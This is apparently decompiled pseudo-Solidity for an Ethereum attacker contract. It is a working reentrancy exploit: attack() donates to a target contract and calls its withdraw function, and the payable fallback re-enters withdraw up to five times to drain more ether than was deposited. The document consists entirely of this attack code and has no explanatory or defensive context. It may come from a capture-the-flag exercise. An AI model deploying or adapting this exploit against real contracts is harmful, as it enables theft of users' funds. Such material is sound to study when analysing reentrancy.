contract main {




// =====================  Runtime code  =====================


address stor0;
uint256 count;

function count() {
    return count
}

function _fallback() payable {
    if count < 5:
        count++
        require ext_code.size(stor0)
        call stor0.0x64dd891a with:
             gas gas_remaining wei
            args 500
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
}

function attack(uint256 arg1) {
    require ext_code.size(stor0)
    call stor0.donate(address rg1) with:
       value arg1 wei
         gas gas_remaining wei
        args this.address
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require ext_code.size(stor0)
    call stor0.0x2e1a7d4d with:
         gas gas_remaining wei
        args arg1
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}



}
